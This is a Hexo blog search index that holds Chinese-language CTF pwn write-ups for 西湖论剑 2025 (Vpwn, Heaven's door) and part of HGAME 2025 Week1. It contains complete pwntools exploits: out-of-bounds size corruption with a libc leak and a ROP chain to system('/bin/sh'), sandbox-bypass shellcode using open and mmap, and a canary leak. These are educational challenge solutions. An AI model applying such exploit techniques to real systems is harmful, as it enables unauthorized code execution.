<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>西湖论剑 2025 Pwn</title>
    <link href="/post/2d0c7fa8.html"/>
    <url>/post/2d0c7fa8.html</url>
    
    <content type="html"><![CDATA[<p>复现网址<a href="https://gz.imxbt.cn/games/21/">西湖论剑2025</a></p><h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>保护全开</p><img src="/post/2d0c7fa8/1740135612744-4573672e-f2b5-4803-b7f6-ed19d87174b0.png" class="" title="img"><p>main 函数，有 edit、push、pop 和 print 操作，操作对象是 v8，v8 实际上是 c++中的 vector，其类型是 char 类型</p><img src="/post/2d0c7fa8/1740136117177-cf560396-7d6c-4a05-a324-186289c997df.png" class="" title="img"><img src="/post/2d0c7fa8/1740136135660-4260d483-f1f0-4770-8ec7-f686e97d85d2.png" class="" title="img"><p>在 edit 函数可以看到有 idx 的检查，而在*(v8+24)处正是 vector 的 size，由于 vector 的大小是 char，则 vector 的每个元素占 4 字节，因此 vector 总共存储了 24 &#x2F; 4 &#x3D; 6 个元素，第 7 个位置就是 size。</p><img src="/post/2d0c7fa8/1740136085356-2407239d-bbb4-426e-94a6-c3489b6abf78.png" class="" title="img"><p>在 push 函数中没有任何检查，因此当我们在 push 第 7 个元素时就会修改 size </p><img src="/post/2d0c7fa8/1740136679131-f5118256-351f-43ed-8259-e5d65b74ab3c.png" class="" title="img"><p>交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the index to edit (0-based): &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the new value: &quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the value to push: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print</span>():<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><p>现在我们修改 size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>attach(p, <span class="hljs-string">&#x27;b *$rebase(0x1455)&#x27;</span>)<br>pause()<br><br>debug()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>push(<span class="hljs-number">50</span>)<br></code></pre></td></tr></table></figure><p>在 rbp-0x28 的位置，前 6 次 push 是 1~6，第 7 次 push 时变成了 0x32 即 50，这样我们就将 size 修改成了 50</p><img src="/post/2d0c7fa8/1740137766451-18142ae9-3a9b-4ae9-bd62-4498e6c771ee.png" class="" title="img"><p>此时我们进行 print 操作，就会将栈上的值打印出来，由于这里的输入是以四字节为单位，所以分成了高地址和地址</p><img src="/post/2d0c7fa8/1740137815818-45d16866-634f-4370-a13a-fe8dfb496dec.png" class="" title="img"><p>泄露出 libc 地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">debug()<br><span class="hljs-built_in">print</span>()<br>p.recvuntil(<span class="hljs-string">b&#x27;StackVector contents: &#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27; &#x27;</span>)<br>low = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>high = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>success(<span class="hljs-string">&#x27;low:&#123;&#125;\nlow:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(low), low))<br>success(<span class="hljs-string">&#x27;high:&#123;&#125;\nhigh:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(high), high))<br></code></pre></td></tr></table></figure><img src="/post/2d0c7fa8/1740144212876-daf3134f-c681-4668-a7ae-48b2ce19d026.png" class="" title="img"><img src="/post/2d0c7fa8/1740144173321-d1fee438-9092-4dff-9ec1-c69af02f2638.png" class="" title="img"><p>最后布置 rop，这里需要先写低地址再写高地址，而且是从 18 的位置开始写入 gadget，18 的位置是返回地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">debug()<br>edit(<span class="hljs-number">18</span>, <span class="hljs-built_in">str</span>(ret &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">19</span>, <span class="hljs-built_in">str</span>((ret &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">20</span>, <span class="hljs-built_in">str</span>(pop_rdi &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">21</span>, <span class="hljs-built_in">str</span>((pop_rdi &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">22</span>, <span class="hljs-built_in">str</span>(binsh &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">23</span>, <span class="hljs-built_in">str</span>((binsh &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">24</span>, <span class="hljs-built_in">str</span>(system &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">25</span>, <span class="hljs-built_in">str</span>((system &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br></code></pre></td></tr></table></figure><img src="/post/2d0c7fa8/1740144480720-6b632ced-853b-4ae6-83c5-21507ac15dd7.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;gz.imxbt.cn&#x27;, 20549)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>attach(p, <span class="hljs-string">&#x27;b *$rebase(0x1455)&#x27;</span>)<br>pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the index to edit (0-based): &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the new value: &quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Enter the value to push: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print</span>():<br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment"># debug()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>push(<span class="hljs-number">50</span>)<br><br><span class="hljs-comment"># debug()</span><br><span class="hljs-built_in">print</span>()<br>p.recvuntil(<span class="hljs-string">b&#x27;StackVector contents: &#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27; &#x27;</span>)<br>low = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>high = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>))<br>success(<span class="hljs-string">&#x27;low:&#123;&#125;\nlow:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(low), low))<br>success(<span class="hljs-string">&#x27;high:&#123;&#125;\nhigh:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(high), high))<br>libc_base = (high &lt;&lt; <span class="hljs-number">32</span>) + low - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = libc_base + <span class="hljs-number">0x29139</span><br><br><span class="hljs-comment"># debug()</span><br>edit(<span class="hljs-number">18</span>, <span class="hljs-built_in">str</span>(ret &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">19</span>, <span class="hljs-built_in">str</span>((ret &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">20</span>, <span class="hljs-built_in">str</span>(pop_rdi &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">21</span>, <span class="hljs-built_in">str</span>((pop_rdi &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">22</span>, <span class="hljs-built_in">str</span>(binsh &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">23</span>, <span class="hljs-built_in">str</span>((binsh &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">24</span>, <span class="hljs-built_in">str</span>(system &amp; <span class="hljs-number">0xffffffff</span>))<br>edit(<span class="hljs-number">25</span>, <span class="hljs-built_in">str</span>((system &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffffffff</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your choice: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h1><p>main 函数调用 mmap 函数，然后读入，可以写 shellcode，后面有一个 sanbox 函数，if 判断count_syscall_instructions 函数的值是否大于 2</p><img src="/post/2d0c7fa8/1740148079341-17965801-4b29-4980-b880-0132b62d5194.png" class="" title="img"><p>count_syscall_instructions 函数，用一个循环来计算 \x0F 和 \x05 的次数，而这两个实际上是 syscall 的机器码，这个函数的目的就是限制 syscall 的使用次数，我们最多只能使用两次 syscall</p><img src="/post/2d0c7fa8/1740148705712-1a472661-9d71-4f57-b9d1-044a2f3dc15d.png" class="" title="img"><p>查看一下沙箱，这是一个白名单，有 open、write 这些函数，但是没有 read 函数</p><img src="/post/2d0c7fa8/1740148194436-b3c6f590-ab76-42db-a976-69319bbeb53c.png" class="" title="img"><p>一般上开启了沙箱之后可以使用 open、read 和 write 函数获取 flag，但是沙箱白名单中并没有 read 函数，而且 syscall 只能使用两次。</p><p>对于缺失 read 函数，可以使用 mmap 函数将文件映射到内存中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><p>参数详解</p><ol><li><p><code>void *addr</code>:</p><ul><li>指定映射区域的起始地址。通常设置为 <code>NULL</code>，表示由系统自动选择合适的地址。</li></ul></li><li><p><code>size_t length</code>:</p><ul><li>映射区域的长度，以字节为单位。通常设置为文件的大小。</li></ul></li><li><p><code>int prot</code>:</p><ul><li><p>指定映射区域的保护模式，可以是以下值的组合：</p><ul><li><p><code>PROT_READ</code>: 映射区域可读。</p></li><li><p><code>PROT_WRITE</code>: 映射区域可写。</p></li><li><p><code>PROT_EXEC</code>: 映射区域可执行。</p></li><li><p><code>PROT_NONE</code>: 映射区域不可访问。</p></li></ul></li></ul></li><li><p><code>int flags</code>:</p><ul><li><p>控制映射区域的特性，可以是以下值的组合：</p><ul><li><p><code>MAP_SHARED</code>: 映射区域与其他进程共享，对映射区域的修改会写回文件。</p></li><li><p><code>MAP_PRIVATE</code>: 映射区域是私有的，对映射区域的修改不会写回文件。</p></li><li><p><code>MAP_ANONYMOUS</code>: 创建一个匿名映射，不与任何文件关联。</p></li><li><p><code>MAP_FIXED</code>: 强制使用指定的 <code>addr</code> 作为映射区域的起始地址。</p></li></ul></li></ul></li><li><p><code>int fd</code>:</p><ul><li>文件描述符，表示要映射的文件。如果是匿名映射（<code>MAP_ANONYMOUS</code>），则设置为 <code>-1</code>。</li></ul></li><li><p><code>off_t offset</code>:</p><ul><li>文件中的偏移量，表示从文件的哪个位置开始映射。通常设置为 <code>0</code>，表示从文件开头开始映射。</li></ul></li></ol><p>返回值</p><ul><li>成功时，返回映射区域的起始地址。</li><li>失败时，返回 <code>MAP_FAILED</code>（通常是 <code>(void *) -1</code>），并设置 <code>errno</code> 以指示错误。</li></ul><p>对于 syscall 限制，可以在使用 open 和 mmap 之后使用程序内的 printf 函数来打印 flag</p><img src="/post/2d0c7fa8/1740151440226-54629daf-a099-4e25-b621-f4d41667002b.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = remote(&#x27;gz.imxbt.cn&#x27;, 20588)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    attach(p, <span class="hljs-string">&#x27;b *0x401709&#x27;</span>)<br>    pause()<br><br><span class="hljs-comment">#debug()</span><br>p.recvuntil(<span class="hljs-string">&#x27;MADE IN HEAVEN !!!!!!!!!!!!!!!!&#x27;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rbx, 0x67616c66</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rdi, rsp</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">mov rax, 2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 0x20000</span><br><span class="hljs-string">mov rsi, 0x1000</span><br><span class="hljs-string">mov rdx, 1</span><br><span class="hljs-string">mov r10, 1</span><br><span class="hljs-string">mov r8, rax</span><br><span class="hljs-string">mov r9, 0</span><br><span class="hljs-string">mov rax, 9</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">mov rdx,0x401150</span><br><span class="hljs-string">call rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后，虽然给的是沙箱白名单，而且白名单里面没有 execve 函数，但是居然可以用 execve 来一把梭，这非预期太离谱了。</p><img src="/post/2d0c7fa8/1740151723217-939d0ce1-6439-4291-ad7c-a28346a68d44.png" class="" title="img"><img src="/post/2d0c7fa8/1740152248589-956f4a3f-0c9a-4534-9900-b243525f30e4.png" class="" title="img"><p>参考</p><p><a href="https://blog.csdn.net/AtomTeam/article/details/145229171?fromshare=blogdetail&sharetype=blogdetail&sharerId=145229171&sharerefer=PC&sharesource=m0_73705227&sharefrom=from_link">2025第八届西湖论剑网络安全技能大赛WriteUp—Pwn篇</a></p><p><a href="https://iyheart.github.io/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/#pwn">2025 西湖论剑 | iyheart 的博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME 2025 Week1</title>
    <link href="/post/8f4f1881.html"/>
    <url>/post/8f4f1881.html</url>
    
    <content type="html"><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h3><p>数组越界</p><p>程序保护全开</p><img src="/post/8f4f1881/1739287281474-ac2e3647-a012-4504-a521-607146363ae9.png" class="" title="img"><p>main 函数</p><img src="/post/8f4f1881/1739333224447-5e975e6a-63e1-4cb4-ba88-f04c7ee79bcf.png" class="" title="img"><img src="/post/8f4f1881/1739333240300-7c090ee0-b1a6-4608-9d6b-8790da64c6f2.png" class="" title="img"><p>运行程序，每次循环中输入的内容都会在后面打印出来。</p><img src="/post/8f4f1881/1739289698209-6b95694c-eace-417a-b26e-da9553816371.png" class="" title="img"><p>经过调试，在第 16 次输入的时候，输入的位置是 rbp-0x10，我们知道 v8 是 rbp-0x10、 v9 是 rbp-0xc，这两个变量都是四字节，那么在 rbp-0x10 位置的前四字节是 v9，后四字节是 v8， 因此第 16 次输入可以同时覆盖 v8 跟 v9；然后我们以此类推，canary 是 17，rbp 是 18，rbp+8 是 19。</p><img src="/post/8f4f1881/1739334987853-ac704c0e-5a76-423c-9d74-f6eb2398860b.png" class="" title="img"><p>如果我们只增加后四字节的数值，即0x1000000011，这样就将 v8 覆盖成 0x11，而此时 v9 是 0x10，那么 v9 小于 v8 就会增加一次输入，在后面比较 v5 和 v8 进入循环就会打印第 17 次的内容。如果我们同时修改前后四字节，例如0x1100000011，这样就将 v9 和 v8 都覆盖成了 0x11，那么 v9 等于 v8 就不会有输入。</p><img src="/post/8f4f1881/1739335245333-b9cd6e13-0427-468e-b341-f16b8f4c62a7.png" class="" title="img"><p>现在我们尝试将 v8 和 v9 覆盖成 17，那么在后面打印的时候就会将 canary 打印出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>:<br>    <span class="hljs-title function_">attach</span><span class="hljs-params">(p, <span class="hljs-string">&#x27;b *$rebase(0x140F)&#x27;</span>)</span><br>    <span class="hljs-title function_">pause</span><span class="hljs-params">()</span><br><br><span class="hljs-meta"># debug()</span><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;How many flowers have you prepared this time?&quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">16</span>))</span><br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span>:<br>    p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;the flower number &#123;&#125; : &quot;</span>.format(i+<span class="hljs-number">1</span>))</span><br>    p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">1</span>))</span><br><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot; : &quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(u64(p64(<span class="hljs-number">0x1100000011</span>))))</span><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">1</span>))</span><br></code></pre></td></tr></table></figure><p>可以看到，rbp-0x10 的位置被覆盖成了0x1100000011；在打印的数值中，我们可以看到十进制的 canary 数值，将其转换 16 进制，确实是 canary</p><img src="/post/8f4f1881/1739293237541-7dbecedc-a578-478b-b115-ad802ad4f8d4.png" class="" title="img"><img src="/post/8f4f1881/1739293346554-a0418917-f1aa-4f3c-b1d7-ff2af2a44462.png" class="" title="img"><img src="/post/8f4f1881/1739293320111-0b4f5e21-0486-408c-876c-2048acace22a.png" class="" title="img"><p>通过将 v8 和 v9 的值覆盖成 17 可以泄露出 canary，那么我们还需要泄露出 libc 地址，而我们知道在 19 的位置有一个 libc 地址，即__libc_start_call_main+128，那么我们将 v8 覆盖成 19 ，v9 的值只需要大于等于 v8，就可以泄露出 canary 和 libc 地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>:<br>    <span class="hljs-title function_">attach</span><span class="hljs-params">(p, <span class="hljs-string">&#x27;b *$rebase(0x140F)&#x27;</span>)</span><br>    <span class="hljs-title function_">pause</span><span class="hljs-params">()</span><br><br><span class="hljs-title function_">debug</span><span class="hljs-params">()</span><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;How many flowers have you prepared this time?&quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">16</span>))</span><br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span>:<br>    p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;the flower number &#123;&#125; : &quot;</span>.format(i+<span class="hljs-number">1</span>))</span><br>    p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">1</span>))</span><br><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot; : &quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(u64(p64(<span class="hljs-number">0x1300000013</span>))))</span><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">1</span>))</span><br><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;Let&#x27;s look at the results.&quot;</span>)</span><br>data_list = p.recvuntil(<span class="hljs-string">&#x27;=&#x27;</span>)<br>data_list = data_list.split(b<span class="hljs-string">&#x27; + &#x27;</span>)<br>canary = <span class="hljs-built_in">abs</span>(<span class="hljs-type">int</span>(data_list[<span class="hljs-number">16</span>]))<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.format(hex(canary)))<br>libc_base = <span class="hljs-type">int</span>(data_list[<span class="hljs-number">18</span>]) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.format(hex(libc_base)))<br></code></pre></td></tr></table></figure><img 